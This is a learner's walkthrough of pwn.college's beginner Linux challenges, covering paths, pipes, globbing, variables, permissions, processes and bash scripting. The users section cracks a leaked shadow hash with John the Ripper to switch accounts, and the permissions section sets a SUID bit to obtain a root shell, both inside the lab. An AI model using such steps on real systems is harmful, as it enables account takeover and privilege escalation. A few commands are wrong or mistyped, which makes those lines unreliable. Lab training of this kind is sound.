# Module 1: Start Hacking
### Link: https://medium.com/@avigaildoestech/linux-luminarian-a-write-up-10e969b05213
“When you type a line of text and hit enter, the shell actually parses your input into a command and its arguments. The first word is the command, and the subsequent words are arguments.”

`echo Hello`: command is `echo`, argument is `Hello`

---

# 1: Pondering Paths

The file system starts at `/`. You can invoke a program by providing its path on the command line (e.g., `/pwn`).

**Position thy self**: If you try to `cd` into the `/` folder then run `/challenge/run`, it’ll tell you that you aren’t in the `/usr/share/zoneinfo/posix/Asia` directory. Switch into that directory, then run `/challenge/run`.

If you put in absolute paths everywhere, then it really doesn’t matter what directory you are in. However, current working directory does matter for relative paths (paths that do not start at root — do not start with `/`).

> “If my cwd is `/`, then a relative path to the file is `tmp/a/b/my_file`. If my cwd is `/tmp/a/b/c`, then a relative path to the file is `../my_file`. The `..` refers to the parent directory.”

**Implicit relative paths**, from `/`: From `/`, do `cd /challenge/run`!

“In most operating systems, including Linux, every directory has two implicit entries that you can reference in paths: `.` and `..`. The first, `.`, refers right to the same directory, so the following absolute paths are all identical to each other:

- `/challenge`
- `/challenge/.`
- `/challenge/./././././`
- `/././.challenge/././`
- `challenge`
- `./challenge`
- `./././challenge`
- `challenge/.`

If your current working directory is `/`, the above relative paths are equivalent to the above absolute paths.

Assuming your current working directory (CWD) is `/home/user/projects/my_project`:

- To access `config.txt`, do `./config.txt`
- To access `data.csv` in a subdirectory named `data`, do `./data/data.csv`
- To access `README.md` in the parent directory (`/home/user/projects`), do `../README.md`
- To access a file named `notes.txt` in `/home/user/notes`, do `../../notes/notes.txt`

**Explicit relative file paths**, from `/`: do `./challenge/run`

- `.`: Represents your current directory (`/`).
- `/challenge`: Tells Linux to look in the `challenge` folder inside your current directory.
- `/run`: This is the file you want to execute (not `cd` into).

**Implicit relative path**: Linux explicitly avoids automatically looking in the current directory when you provide a “naked” path. If you `cd` into `/challenge` then do `/challenge$ run`, it won’t invoke `/challenge/run`. You can do `cd /challenge` then `./run`.

**Home sweet home**: `hacker@dojo~$`: `~` is shorthand for `/home/hacker`. Whenever bash sees `~` provided as the start of an argument in a way consistent with a path, it will expand it to your home directory.

In this challenge, `/challenge/run` will write a copy of the flag to any file you specify as an argument on the command line, with these constraints:

- The argument must be an absolute path inside your home directory.
- You need to use the tilde (`~`) as a shortcut.
- `~` stands for `/home/hacker`.
- `/` separates the folder from the file.
- `x` (or any single letter) can be the filename.

Put them together, and you get `~/x`. This is exactly 3 characters, but the shell will expand it into the absolute path `/home/hacker/x`.

Run: `/challenge/run ~/a`

---

# 2: Comprehending Commands

For the first challenge, just do `cat flag`. For the next challenge, do `cat /flag` to specify `cat`’s argument as an absolute path.

For third: `hacker@commands~more-catting-practice:~$ cat /lib/modules-load.d/flag`

**grep**: `hacker@dojo:~$ grep SEARCH_STRING /path/to/file`

To grep a file for the flag, which starts with `pwn.college`:
`hacker@commands~grepping-for-a-needle-in-a-haystack:~$ grep pwn.college /challenge/data.txt`

**diff** compares two files line by line and shows exactly what’s different between them. Do `diff /challenge/decoys_only.txt /challenge/decoys_and_real.txt`.

Then do `ls` to find the new name of `run`, and do `./new_name` to run it!

**touch**: `touch file_name` to create a file. Example: `touch /tmp/pwn` then `cd /challenge` then `./run`.

**rm**: `rm file_name` to delete it.

**mv**: `mv /flag /tmp/hack-the-planet` to move a file, then run `/challenge/check` to get the flag!

**cp**: `cp /flag /tmp/hack-the-planet` to copy a file, then run `/challenge/check` to get the flag!

**ls -a** to view hidden files.

For the next one, you can’t `cat` the `INSIGHT-TRAPPED` or it will self-destruct. You must `ls /var/cache/man/oldlocal`, find the file name, then `cat /var/cache/man/oldlocal/SECRET`.

**mkdir**: `mkdir /tmp/pwn`, `cd /tmp/pwn`, `touch college`, `/challenge/run` to create a `/tmp/pwn` directory and make a `college` file in it.

“The `find` command takes optional arguments describing the search criteria and the search location. If you don’t specify a search criteria, `find` matches every file. If you don’t specify a search location, `find` uses the current working directory (`.`).”

You can also search the whole file system if you do `find / -name hacker`! Here, we’ll do `find / -name flag` and `cat` through the results until we find the real flag.

**Links**: Allows two programs to access the same data while expecting the data to be in two different locations. A hard link is addressing your apartment using multiple addresses that lead directly to the same place (Apt 2 vs Unit 2), while a soft link is when you move apartments and have the postal service automatically forward your mail from your old place to the new place.

A hard link is an alternate address that indexes the contents of a file. Accessing the hard link and original file yield the exact same data. A soft link contains the original file name, and when you access the symbolic link, Linux will read the original file name then automatically access that file.

Symbolic links are created with the `ln` command with the `-s` argument:

The `file` command recognizes symlinks.

For the challenge, create the symlink `ln -s /flag /home/hacker/not-the-flag` then do `/challenge/catflag`!

---

# 3: Documentation

For the first, do `/challenge/challenge --giveflag`.

Then, `/challenge/challenge --printfile /flag`.

`man challenge` to view documentation for `challenge`, which tells you to do `/challenge/challenge --gmguwg 855`.

Scroll man pages with arrow keys and search with `/`. After searching, you can hit `n` to go to the next result and `N` to go to the previous result. Instead of `/`, you can use `?` to search backwards.

Do `man challenge` then search “flag” using `/`. You’ll find the correct flag to run.

Now, we have to search for the right manpage by reading the `man man` page. You can search the manpage database using the `-k` flag (which stands for “keyword”): `man -k challenge`. This reveals a weirdly named man page, and when you `man weird_name`, you will see which flag to run with `/challenge/challenge`.

Next, we learn how to use `--help`.

Next, we do `help challenge` — this represents a builtin.

---

## 4: File Globbing

When it encounters a `*` character in any argument, the shell will treat it as a “wildcard” and try to replace that argument with any files that match the pattern. It’s easier to show you than explain:

```bash
hacker@dojo:~$ echo Look: file_*
Look: file_a file_b file_c


When zero files are matched, by default, the shell leaves the glob unchanged:

```bash
hacker@dojo:~$ echo Look: nope_*
Look: nope_*
```

Now, we have to change to `/challenge` using globbing, which we do by replacing the long name `/challenge` with a short wildcard pattern that the shell will expand for you: `cd /ch*`.

When it encounters a `?` character in any argument, the shell will treat it as a single-character wildcard. This works like `*`, but only matches one character: `file_?` results in `file_a` and `file_b`, `file_??` results in `file_cc`.

For the challenge, do `cd /?ha??enge`.

The square brackets are, essentially, a limited form of `?`, in that instead of matching any character, `[]` is a wildcard for some subset of potential characters, specified within the brackets. For example, `[pwn]` will match the character `p`, `w`, or `n`.

Do `/challenge/run file_[bash]`.

**Part 2**: Once more, we’ve placed a bunch of files in `/challenge/files`. Starting from your home directory, run `/challenge/run` with a single argument that bracket-globs into the absolute paths to the `file_b`, `file_a`, `file_s`, and `file_h` files!

Do `/challenge/run /challenge/files/file_[bash]`.

You can do multiple globs in a single word, like `/*fl*`, which looks for all files in `/` that start with anything (including nothing), then have an `f` and an `l`, and end in anything (including `ag`), which makes `flag`.

`cd` into `/challenge/files` and run `/challenge/run` with a single argument: a short (3 characters or less) globbed word with two `*` globs in it that covers every word that contains the letter `p`: `/challenge/run *p*`

`cd` into `/challenge/files` and, using the globbing you’ve learned, write a single, short (6 characters or less) glob that (when passed as an argument to `/challenge/run`) will match only the files `"challenging"`, `"educational"`, and `"pwning"`: `/challenge/run [cep]*` matches any file starting with `c`, `e`, or `p` then whatever comes after!

If the first character in `[]` is a `!` or (in newer versions of bash) a `^`, the glob inverts, and that bracket instance matches characters that aren’t listed. `file_[^ab]` results in `file_c`.

Armed with this knowledge, go forth to `/challenge/files` and run `/challenge/run` with all files that don’t start with `p`, `w`, or `n`: `/challenge/run [!pwn]*`

`[!pwn]*` translates to: “Files starting with anything except `p`, `w`, or `n`, followed by anything.”

---

## 4: Practicing Piping

Redirect the word `PWN` to filename `COLLEGE` with `echo PWN > COLLEGE`.

To redirect command output of `/challenge/run`, do `/challenge/run > myflag`, then `cat myflag`.

`>` will create a new file every time, so do `>>` to append instead: `/challenge/run >> /home/hacker/the-flag`

**Redirecting errors** — FD 0: Standard Input, FD 1: Standard Output, FD 2: Standard Error.

“When you redirect process communication, you do it by FD number, though some FD numbers are implicit. For example, a `>` without a number implies `1>`, which redirects FD 1 (Standard Output). Thus, the following two commands are equivalent: `echo hi > asdf` and `echo hi 1> asdf`”

If you have a command that might produce data via standard error (such as `/challenge/run`), you can do: `/challenge/run 2> errors.log`, which redirects standard error (FD 2) to the `errors.log` file.

You can also redirect multiple file descriptors at the same time: `some_command > output.log 2> errors.log`, which redirects output to `output.log` and errors to `errors.log`.

Redirect output of `/challenge/run` to `myflag` and errors to `instructions`: `/challenge/run > myflag 2> instructions`

- `>` (or `1>`): Grabs the Standard Output (the flag) and shoves it into the `myflag` file.
- `2>`: Grabs the Standard Error (the instructions/feedback) and shoves it into the `instructions` file.

**Redirecting input**:

In this level, we will practice using `/challenge/run`, which will require you to redirect the `PWN` file to it and have the `PWN` file contain the value `COLLEGE`! To write that value to the `PWN` file, recall the prior challenge on output redirection from `echo`!

```bash
echo COLLEGE > PWN
/challenge/run < PWN
```

**Grepping stored results**:

Redirect output of `/challenge/run` to `/tmp/data.txt`, one of the lines of text will be the flag.

```bash
/challenge/run > /tmp/data.txt
grep pwn.college /tmp/data.txt
```

**Grep live output**: `/challenge/run | grep pwn.college`

**Grep errors**: `/challenge/run 2>&1 | grep pwn.college`

Here is how to read it:

- `2`: “Take Stream 2 (Standard Error)…”
- `>`: “…and redirect it…”
- `&1`: “…to the address of Stream 1 (Standard Output).”

By doing this, you are telling the error messages to jump onto the same conveyor belt as the normal output. Once they are on that belt (FD 1), the pipe (`|`) can grab them and hand them to `grep`.

“The shell has a `>&` operator, which redirects a file descriptor to another file descriptor. This means that we can have a two-step process to grep through errors: first, we redirect standard error to standard output (`2>&1`) and then pipe the now-combined stderr and stdout as normal (`|`)!”

`grep -v`: shows lines that do not match a pattern, filter out all lines containing `DECOY`: `/challenge/run | grep -v DECOY`

**Filtering with sed**: Easy way to substitute patterns in text with a different word. `/challenge/run` will print out the flag, but between each character there will be the string `"FAKEFLAG"`. Your job is to filter out the garbage data from the flag.

`sed "s/oldword/newword/g"`:

- `s` = substitute
- `oldword` = word to replace
- `newword` = replacement for oldword
- `/g` = global

```bash
/challenge/run | sed 's/FAKEFLAG//g'
```

`//`: This is the Replacement. Since there is nothing between these slashes, it replaces the pattern with an empty string (effectively deleting it).

**Duplicating piped data with tee**: `tee` duplicates data flowing through your pipes to any number of files provided on the command line. Pipe `/challenge/pwn` into `/challenge/college`.

Normally, if you run `/challenge/pwn | /challenge/college`, the output of `pwn` disappears instantly into `college`. You never see it.

To fix this, you will use `tee` to create a "T-junction" in the pipe, copying that secret data to a file you can read.

```bash
/challenge/pwn | tee intercepted_data | /challenge/college
cat intercepted_data
```

— tells you to do `/challenge/pwn --secret[SECRET_ARG]`

```bash
/challenge/pwn --secret QiySpHHl | /challenge/college
```

**Process substitution for input**:

Process substitution, written as `<(command)`, tricks the shell into treating a command’s output like a temporary file path. This allows you to feed the live output of two running programs directly into comparison tools like `diff` without ever creating real files on the disk.

Now, you’ll `diff` two sets of command outputs: `/challenge/print_decoys`, which will print a bunch of decoy flags, and `/challenge/print_decoys_and_flag` which will print those same decoys plus the real flag.

Use process substitution with `diff` to compare the outputs of these two programs and find your flag!

```bash
diff <(/challenge/print_decoys) <(/challenge/print_decoys_and_flag)
```

**Writing to multiple programs**:

Process substitution allows you to turn a command into a temporary file object so that you can write data directly to its input stream. By using the syntax `>(command)` inside of a `tee` command, you can take a single output stream and duplicate it into multiple running programs simultaneously instead of just static files. This technique lets you feed the output of the hack script into both the `"the"` and `"planet"` scripts at the exact same time.

```bash
/challenge/hack | tee >(/challenge/the) >(/challenge/planet)
```

**Split-piping stderr and stdout**:

You need to route the standard output to the planet script using a normal pipe while simultaneously diverting the standard error to the “the” script using process substitution. The syntax `2> >(command)` allows you to catch the error stream and send it to a separate program before the standard output moves on to the next pipe.

In this challenge, you have:

- `/challenge/hack`: this produces data on stdout and stderr
- `/challenge/the`: you must redirect `hack`'s stderr to this program
- `/challenge/planet`: you must redirect `hack`'s stdout to this program

```bash
/challenge/hack 2> >(/challenge/the) | /challenge/planet
```

**Named pipes**:

A FIFO (First In, First Out) is a “named pipe” that exists as a file on your hard drive but behaves like a pipe in memory. Unlike standard files, FIFOs do not store data on the disk; they pause (block) the program writing to them until another program reads from them, ensuring perfect synchronization between processes.

You create a FIFO using the `mkfifo` command: `mkfifo my_pipe`.

Unlike the automatic named pipes from process substitution:

- You control where FIFOs are created
- They persist until you delete them
- Any process can write to them by path (e.g., `echo hi > my_pipe`)
- You can see them with `ls` and examine them like files

Why use FIFOs?

- **No disk storage**: FIFOs pass data directly between processes in memory — nothing is saved to disk
- **Ephemeral data**: Once data is read from a FIFO, it’s gone (unlike files where data persists)
- **Automatic synchronization**: Writers block until the readers are ready, and vice-versa. This is actually useful! It provides automatic synchronization. Consider the example above: with a FIFO, it doesn’t matter if `cat myfifo` or `echo pwn > myfifo` is executed first; each would just wait for the other. With files, you need to make sure to execute the writer before the reader.
- **Complex data flows**: FIFOs are useful for facilitating complex data flows, merging and splitting data in flexible ways, and so on. For example, FIFOs support multiple readers and writers.

You’ll need to create a `/tmp/flag_fifo` file and redirect the stdout of `/challenge/run` to it. If you’re successful, `/challenge/run` will write the flag into the FIFO! Go do it!

Because the FIFO blocks, you will need to read from it (using `cat`) to trigger the flow of data and reveal the flag.

```bash
mkfifo /tmp/flag_fifo
/challenge/run > /tmp/flag_fifo & cat /tmp/flag_fifo
```

---

## 6: Shell Variables

**Printing variables**:

You can also print out variables with `echo`, by prepending the variable name with a `$`. For example, there is a variable, `PWD`, that always holds the current working directory of the current shell. You print it out as so:

```bash
echo $FLAG
```

**Setting variables**:

Set `PWN` to `college`: `PWN=COLLEGE`. `echo $PWN`

**Multi-word variables**:

```bash
PWN="COLLEGE YEAH"
```

**Exporting variables**:

`echo "VAR is: $VAR"` gives `VAR is: 1337`

In this challenge, you must invoke `/challenge/run` with the `PWN` variable exported and set to the value `COLLEGE`, and the `COLLEGE` variable set to the value `PWN` but not exported (e.g., not inherited by `/challenge/run`). Good luck!

```bash
export PWN=COLLEGE
COLLEGE=PWN
/challenge/run
```

- `export PWN=COLLEGE`: You created the variable `PWN` and used `export` to promote it to an Environment Variable. `/challenge/run` will “see” this variable when it starts.
- `COLLEGE=PWN`: You created a standard shell variable. Because you did not use `export`, this variable stays private to your shell. `/challenge/run` will not inherit it, which is exactly what the challenge asked for.
- `/challenge/run`: The program executes, checks its environment, sees `PWN` (Good!) and doesn’t see `COLLEGE` (Good!), and gives you the flag.

**Printing exported variables**:

The `env` command dumps the entire list of "global" (exported) variables that your shell knows about.

```bash
env | grep FLAG
```

**Storing command output**:

```bash
FLAG=$(cat /flag)
echo "$FLAG"
```

gives `pwn.college{blah}`

Read the output of the `/challenge/run` command directly into a variable called `PWN`, and it will contain the flag!

```bash
PWN=$(/challenge/run)
echo $PWN
```

**Reading input**:

In this challenge, your job is to use `read` to set the `PWN` variable to the value `COLLEGE`. Good luck!

```bash
read PWN
```

type in `COLLEGE`

**Reading files**:

This section teaches you how to efficiently load the contents of a file directly into a variable using input redirection (`<`) combined with the `read` command. This method is preferred over using `cat` (e.g., `VAR=$(cat file)`) because it avoids launching an unnecessary extra subprocess, keeping your script cleaner and faster.

Read `/challenge/read_me` into the `PWN` environment variable:

```bash
read PWN < /challenge/read_me
```

---

## 7: Data Manipulation

**Translating characters**:

In its most basic usage, `tr` translates the character provided in its first argument to the character provided in its second argument:

```bash
hacker@dojo:~$ echo PWM.COLLAGE | tr MA NE
-> PWN.COLLEGE
```

`/challenge/run` will print the flag but will swap the casing of all characters (e.g., `A` will become `a` and vice-versa):

```bash
/challenge/run | tr 'A-Za-z' 'a-zA-Z'
```

`tr` maps the first character of set 1 (`A`) to the first of set 2 (`a`), effectively flipping the case for every letter.

**Deleting characters**:

`tr` can also translate characters to nothing (i.e., delete them):

```bash
echo PAWN | tr -d A
-> PWN
```

In the output of `/challenge/run`, I’ll intersperse some decoy characters (specifically: `^` and `%`) among the flag characters. Use `tr -d` to remove them:

```bash
/challenge/run | tr -d '^%'
```

**Deleting newlines**:

This lesson teaches you how to clean up data by removing “invisible” formatting characters, specifically newlines (`\n`), using the `tr` command with the delete flag (`-d`). Since you cannot easily type a newline into a command (because pressing Enter runs the command), you use the escape sequence `\n` inside quotes to tell the shell to target line breaks.

Run this command to pipe the fragmented output into `tr` and delete every newline character, stitching the flag back together:

```bash
/challenge/run | tr -d '\n'
```

**Extracting the first lines with head**:

`head` grabs the first few lines of input (default 10 lines), or you can reduce it to a given number:

```bash
hacker@dojo:~$ cat /something/very/long | head -n 2
```

This challenge’s `/challenge/pwn` outputs a bunch of data, and you’ll need to pipe it through `head` to grab just the first 7 lines and then pipe them onwards to `/challenge/college`, which will give you the flag if you do this right!

```bash
/challenge/pwn | head -n 7 | /challenge/college
```

**Extracting specific sections of text**:

This level introduces the `cut` command, which allows you to extract specific vertical columns from a dataset based on a delimiter (separator). You use the `-d` flag to specify what separates the columns (like a space) and the `-f` flag to select which column number you want to keep.

In this challenge, the `/challenge/run` program will give you a bunch of lines with random numbers and single characters (characters of the flag) as columns. Use `cut` to extract the flag characters, then pipe them to `tr -d "\n"` (like the previous level!) to join them together into a single line. Your solution will look something like `/challenge/run | cut ??? | tr ???`, with the `???` filled out.

`/challenge/run | head` shows that the flag characters are in the second column.

```bash
/challenge/run | cut -d " " -f 2 | tr -d "\n"
```

extracts column 2 and stitches it all together to give the flag.

**Sorting data**:

In this challenge, there’s a file at `/challenge/flags.txt` containing 100 fake flags, with the real flag mixed among them. When sorted alphabetically, the real flag will be at the end (we made sure of this when generating fake flags). Go get it!

```bash
sort /challenge/flags.txt | tail
```

---

## 8: Processes and Jobs

**Listing processes**:

The `ps` command lists running processes, but the default usage only shows what is active in your current terminal window. To see a complete view of every process running on the system, you should use `ps -ef` or `ps aux`, which display all processes along with their unique Process ID (PID) and the exact command used to launch them. If the command paths are too long and get cut off at the edge of your screen, you can append `ww` to the flags (like `ps -efww`) to force the output to wrap so you can read the full path.

I have once again renamed `/challenge/run` to a random filename, and this time made it so that you cannot `ls` the `/challenge` directory! But I also launched it, so you can find it in the running process list, figure out the filename, and relaunch it directly for the flag! Good luck!

Run `ps -ef` to list all running commands, find the one that says `challenge`, then run it.

**Killing processes**:

Now, it’s time to terminate your first process! In this challenge, `/challenge/run` will refuse to run while `/challenge/dont_run` is running! You must find the `dont_run` process and kill it. If you fail, pwn.college will disavow all knowledge of your mission. Good luck.

```bash
ps -ef | grep dont_run
kill [PID]
```

**Killing misbehaving processes**:

This challenge requires you to clear a “jammed” communication pipe by identifying and terminating a disruptive background process that is flooding it with garbage data. You will use the process listing command to find the Process ID (PID) of the decoy, the `kill` command to stop it, and then you will read from the pipe while running the challenge program to capture the clean flag.

In this challenge, there’s a decoy process that’s hogging a critical resource — a named pipe (FIFO) at `/tmp/flag_fifo` into which (like in the Practicing Piping FIFO challenge) `/challenge/run` wants to write your flag. You need to kill this process.

First, find the Process ID (PID) of the program named `/challenge/decoy`: `ps -ef`

Next, terminate that process using its PID (replace `1234` with the number you found), start a background reader on the pipe so it doesn’t block, and finally run the solution:

```bash
kill 1234
cat /tmp/flag_fifo & /challenge/run
```

**Processes**:

Use `CTRL + Z` to suspend a process and `fg` command to resume processes in the foreground. You can resume processes in the background with `bg`.

Run Command in Background:

```bash
/challenge/run &
```

---

## 9: Untangling Users

`/etc/passwd` has a list of users.

With no arguments, `su` will start a root shell. However, you can also give a username as an argument to switch to that user instead of root.

Passwords were moved to `/etc/shadow`.

**Cracking Passwords**:

We have access to the hash in `/challenge/shadow-leak`, which we can use John the Ripper on.

```bash
john /challenge/shadow-leak
```

This reveals: `aardvark`, so we can `su` to `zardus`.

**sudo**:

`sudo` is safer and more manageable because it allows authorized users to execute specific commands with root privileges without needing to know the root account's password. It relies on security policies rather than password sharing.

```bash
sudo cat /flag
```

---

## 10: Perceiving Permissions

“You can check out the permissions of a file or directory using `ls -l`.

The first character of each line represents the file type. In `pwn_directory`’s case, the `d` indicates that it’s a directory, and in `college_file`’s case, the `-` represents that it’s a normal file.”

3 characters denote permissions of the owner, 3 characters denote permissions for the group that owns the file, 3 characters denote permissions for everyone else (other users and other groups).

**Changing file ownership**:

`chown [username] [file]` This command stands for change owner. It updates the user ownership of a specific file or directory. In a standard Linux environment, only the root user can change ownership of files, but once you own a file, you have full control over it (including the ability to read it).

The flag file is currently owned by root, preventing you from reading it. Since the challenge has granted you special permission to use `chown`, you can take ownership of the file yourself.

Make yourself the owner: `chown hacker /flag`

Now, `cat /flag`.

**Groups and files**:

`chgrp [group] [file]` This command stands for change group. Just as files have an individual user owner, they also have a “group owner” that determines which collection of users can access the file. While you usually need to be the root user or the file owner to change this, `chgrp` allows you to reassign a file to a specific group (like your own `hacker` group), granting access to everyone in that group. You can verify your current group memberships with the `id` command.

The flag file is currently owned by the root group, which you are not a part of. However, the file is readable by whichever group owns it. You need to change the file's group to `hacker` (the group you belong to) so that you gain read permission.

1. Change the group, assign the `/flag` file to `hacker` group with `chgrp hacker /flag`
2. `cat /flag`

**Group names**:

`id` This command displays the current user’s security identity, including the User ID (`uid`), Group ID (`gid`), and the list of groups they belong to. It is essential for verification when you need to know exactly which permissions apply to you or what your randomized group name is in a non-standard environment.

For this challenge, run the `id` command to find your group, then change group with `chgrp [group_name] /flag` and read flag with `cat /flag`.

**Changing permissions**:

`chmod [WHO]+/-[WHAT] [FILE]` This command stands for change mode and is used to modify file access permissions. Permissions are divided into read (`r`), write (`w`), and execute (`x`) access for three categories of users: the owning user, the owning group, and others (everyone else). You can also use `a` to represent all categories at once. To change permissions, you combine the target audience (`u`, `g`, `o`, or `a`) with an operator (`+` to add, `-` to remove) and the permission type (`r`, `w`, or `x`). For example, `chmod u+x file` allows the owner to execute the file, while `chmod a-w file` ensures no one can write to it.

`chmod a+r /flag` to make the flag readable for everyone, then `cat /flag`.

**Executable files**:

`chmod +x [file]` This is the specific flag used to make a file executable. In Linux, programs (scripts or binaries) cannot run unless the “execute” (`x`) permission is set. You can add this permission for everyone using `a+x` (all + execute) or just `+x`. Without this, the system treats the file as just text or data, and attempts to run it will result in a “Permission denied” error.

The challenge program `/challenge/run` currently lacks the execution permission, so the shell refuses to run it. You need to add the `x` permission and then execute the file.

`chmod a+x /challenge/run` grants permissions to all users, now run `/challenge/run`.

**Permission practice**:

Remove write permission from the user: `chmod u-w /challenge/pwn`

Then, remove read permission from user: `chmod u-r /challenge/pwn`

Then, add write permission for user and write permission for world.

`chmod u+w,o+w /challenge/pwn`

`chmod a+r /flag` -> `cat /flag`

**Permissions setting practice**:

`chmod [WHO]=[PERMS],[WHO]=[PERMS] [FILE]` The `=` operator is an absolute assignment. Unlike `+` or `-`, which modify existing bits, `=` overwrites the permissions for that category entirely. Chaining with a comma (`,`) allows you to set different rules for the user, group, and others in a single command.

- `---` = 0
- `--x` = 1
- `-w-` = 2
- `-wx` = 3 (2+1)
- `r--` = 4
- `r-x` = 5 (4+1)
- `rw-` = 6 (4+2)
- `rwx` = 7 (4+2+1)

Set flag permissions to readable: `chmod 400 /flag` then `cat /flag`

**The SUID Bit**:

`chmod u+s [FILE]` This command sets the SUID (Set User ID) bit on an executable. In Linux, when a file has the SUID bit, it doesn’t run with the permissions of the person who typed the command; instead, it runs with the permissions of the file owner.

In `ls -l` output, the user’s execute bit (`x`) is replaced by an `s` (e.g., `-rwsr-xr-x`).

If a file is owned by root and you set the SUID bit, any user who executes that file essentially becomes root for the duration of that program’s execution. This is a primary target for privilege escalation in penetration testing.

In this challenge, you have a program called `/challenge/getroot` that is designed to give you a root shell, but it currently lacks the SUID bit. Without that bit, it just runs as your normal `hacker` user and fails. You need to enable the “S” bit so it runs as root.

Check current permissions with `ls -l /challenge/getroot`: `-rwxr-xr-x`

Add the SUID bit: `chmod u+s /challenge/getroot`

Run `/challenge/getroot` then `cat /flag`.

---

## 11: Chaining Commands

**Semicolons**:

`[command_1]; [command_2]` The semicolon (`;`) is a command separator that allows you to run multiple commands sequentially on a single line. The shell will execute `command_1`, wait for it to finish, and then immediately execute `command_2`. It functions exactly like pressing Enter between commands but allows for faster execution and one-line scripting.

Commands are executed regardless of whether the previous one succeeded or failed (unlike the `&&` operator).

Ideal for repetitive tasks, such as cleaning a directory and then listing its contents: `rm *.tmp; ls -l`.

Run: `/challenge/pwn; /challenge/college`

**Building on success**:

`[command_1] && [command_2]` The `&&` (Logical AND) operator is used to chain commands conditionally. The shell executes `command_1` and only proceeds to `command_2` if `command_1` finishes successfully (with an exit code of 0). If the first command fails, the second one is completely ignored.

This is the standard for critical workflows. For example, `cd /important/dir && rm *` prevents you from accidentally deleting files in the wrong folder if the `cd` command fails.

`/challenge/first-success && /challenge/second`

**Handling failure**:

`[command_1] || [command_2]` The `||` (Logical OR) operator is used for error handling and fallbacks. The shell executes `command_1`, and only if it fails (exits with a non-zero code) will the shell execute `command_2`. If the first command is successful, the second one is skipped entirely.

Ideal for alerting yourself when a long-running task fails. For example: `python3 long_script.py || echo "The script crashed!"`

`/challenge/first-failure || /challenge/second`

**Your first shell script**:

`bash [script_name].sh` A shell script is a plain text file containing a sequence of commands that the shell (like `bash`) can read and execute as if you were typing them manually. Instead of chaining commands with `;` or `&&` on a single long line, you can list them line-by-line in a file.

You run the script by passing the filename to a shell interpreter, such as `bash x.sh`.

You can use an editor like VSCode or the Desktop Text Editor to create a file named `x.sh`. Alternatively, you can do it quickly from the command line using redirection:

```bash
echo "/challenge/pwn" > x.sh
echo "/challenge/college" >> x.sh
```

Run script: `bash x.sh`

**Redirecting script output**:

`bash [script].sh | [command]` A shell script is treated by Linux as a single stream of data. This means you can aggregate the output of multiple commands inside a script and pipe their collective result into another program.

Instead of piping `/challenge/pwn | /challenge/solve` and then `/challenge/college | /challenge/solve` separately, the script groups them. The `|` after the script catches all output from every command inside the `.sh` file and feeds it to the receiver.

This works for all redirection. You can do `bash script.sh > file.txt` to save everything the script says into one place, or `bash script.sh | grep "flag"` to search everything the script outputs.

Open your editor or use `echo` to put these two commands on separate lines:

```bash
/challenge/pwn
/challenge/college
```

Run the script and pipe its entire output into the `/challenge/solve` utility:

```bash
bash x.sh | /challenge/solve
```

**Executable shell scripts**:

`chmod +x [script].sh` By default, newly created text files do not have execute permissions. To run a script as a standalone program (using `./script.sh` instead of `bash script.sh`), you must add the execute bit.

The Dot-Slash (`./`): When you type a command like `ls`, Linux looks in specific system folders (defined in your `PATH` variable) to find it. Since your home directory usually isn't in that list, you use `./` to tell the shell: "Look in the current directory for this file."

Shebang (Advanced Tip): While not strictly required for this level, adding `#!/bin/bash` as the very first line of your script tells the system exactly which interpreter to use to run the file.

Create the script: `echo "/challenge/solve" > solve.sh`

Make executable: `chmod +x solve.sh`

Run directly using relative path: `./solve.sh`

**Understanding shebangs**:

`#!` (The Shebang) The Shebang (`#!`) is a special sequence of characters at the very beginning of a script that tells the Linux kernel exactly which interpreter should be used to run the code. Without it, the system might guess incorrectly or fail if you try to run the script from outside a shell.

`#!` followed immediately by the absolute path to the interpreter (e.g., `#!/bin/bash` or `#!/usr/bin/python3`).

Create the script: `nano solve.sh`

```bash
#!/bin/bash
echo "hack the planet"
```

`chmod a+x /home/hacker/solve.sh`

**Scripting with Arguments**:

`$1`, `$2`, `$3`… (Positional Parameters) Shell scripts use special variables to handle data passed to them when they are executed. These are called positional parameters because their names correspond to their position in the command line.

- `$0`: The name of the script itself.
- `$1`: The first argument after the script name.
- `$2`: The second argument.
- `$@`: A shorthand for "all arguments."

Create the script with `nano solve.sh`

```bash
#!/bin/bash
echo "$2 $1"
```

Note: By putting `$2` before `$1`, you are effectively reversing whatever input is provided.

```bash
chmod a+x /home/hacker/solve.sh
/home/hacker/solve.sh apple banana
```

**Scripting with conditionals**:

`if [ condition ]; then … fi` Bash uses the `if` statement for branching logic. The script evaluates the expression inside the brackets and only executes the code between `then` and `fi` if the result is true.

You must include spaces around the brackets: `[ "$1" == "pwn" ]`. Without them, Bash will throw a syntax error because it treats `[` as a command and needs the spaces to identify the arguments.

Unlike many languages that use curly braces `{}` or `end`, Bash uses the keyword `if` spelled backward to close the block.

It is best practice to wrap your variables in double quotes (e.g., `"$1"`) to prevent the script from breaking if the argument is empty.

Put this in the script:

```bash
#!/bin/bash
if [ "$1" == "pwn" ]
then
echo "college"
fi
```

`chmod a+x /home/hacker/solve.sh`

**Scripting with default cases**:

`if [ condition ]; then … else … fi` The `else` statement provides a fallback path. It ensures your script does something even when the specific condition you’re looking for isn’t met. It’s the “default” action for your logic.

The `else` block sits between the `then` and the `fi`.

Unlike `if`, the `else` keyword does not take a bracketed condition; it simply activates whenever the `if` test fails.

Only the `if` (and `elif`) statements use the `then` keyword.

Expand script:

```bash
#!/bin/bash
if [ "$1" == "pwn" ]
then
echo "college"
else
echo "nope"
fi
```

**Scripting with multiple conditions**:

`if… elif… else… fi` The `elif` keyword allows you to chain multiple specific conditions together. The shell checks them in order from top to bottom. As soon as it finds a condition that is true, it executes the corresponding code and skips the rest of the block.

Efficiency: This is much cleaner than nesting multiple `if` statements inside each other.

The “then” Requirement: Just like the initial `if`, every `elif` must be followed by its own `then` line.

The Spacing Trap: Remember that `[` and `]` are actually commands. If you type `["$1"=="hack"]` without spaces, the shell will look for a program named `["hack"=="hack"]` and fail.

```bash
#!/bin/bash
if [ "$1" == "hack" ]
then
echo "the planet"
elif [ "$1" == "pwn" ]
then
echo "college"
elif [ "$1" == "learn" ]
then
echo "linux"
else
echo "unknown"
fi
```

**Reading shell scripts**:

`file [FILE]` Before you `cat` a file, it is good practice to check what kind of data it contains. The `file` command looks at the “magic bytes” of a file and tells you if it is a human-readable script or a compiled binary.

- `ASCII text/shell script`: Safe to `cat`. You can read the logic and find secrets.
- `ELF` (Executable and Linkable Format): This is compiled machine code. If you `cat` this, your terminal will likely fill with “garbage” characters and might even beep or break your layout.

`cat /challenge/run`

`read GUESS`: This line tells the script to pause and wait for the user to type something and press Enter. Whatever you type is stored in the variable `$GUESS`.

